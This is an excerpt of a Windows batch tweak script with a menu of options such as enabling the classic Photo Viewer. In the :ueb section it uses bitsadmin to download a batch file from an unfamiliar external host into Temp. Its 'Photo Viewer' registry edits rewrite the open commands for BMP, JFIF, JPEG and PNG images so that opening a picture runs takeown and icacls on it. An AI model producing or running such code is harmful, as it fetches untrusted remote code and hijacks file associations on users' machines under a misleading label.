...
echo  18. Enable Clasic Photo Viewer
echo  19. Disable Ads In Windows
echo  20. Disable the "- Shortcut" Text
echo +-------------------------------------------+
...
if "%choice%"=="18" goto ecpv
if "%choice%"=="19" goto daiw
if "%choice%"=="20" goto srtc
::Colors
...
:ueb
bitsadmin /transfer myDownloadJob /download /priority normal http://theadastech.run.place/bostr/edge.bat %USERPROFILE%\AppData\Local\Temp\edge.bat
...
reg add "HKLM\SOFTWARE\Microsoft\Windows Photo Viewer\Capabilities\FileAssociations" /v ".jxr" /t REG_SZ /d "PhotoViewer.FileAssoc.JPEG" /f
...
reg add "HKLM\SOFTWARE\Classes\PhotoViewer.FileAssoc.BITMAP\shell\open\command" /v "" /t REG_SZ /d "cmd.exe /c takeown /f \"%1\" && icacls \"%1\" /grant administrators:F" /f
...
reg add "HKLM\SOFTWARE\Classes\PhotoViewer.FileAssoc.JFIF\shell\open\command" /v "" /t REG_SZ /d "cmd.exe /c takeown /f \"%1\" && icacls \"%1\" /grant administrators:F" /f
...
reg add "HKLM\SOFTWARE\Classes\PhotoViewer.FileAssoc.JPEG\shell\open\command" /v "" /t REG_SZ /d "cmd.exe /c takeown /f \"%1\" && icacls \"%1\" /grant administrators:F" /f
...
reg add "HKLM\SOFTWARE\Classes\PhotoViewer.FileAssoc.PNG\shell\open\command" /v "" /t REG_SZ /d "cmd.exe /c takeown /f \"%1\" && icacls \"%1\" /grant administrators:F" /f
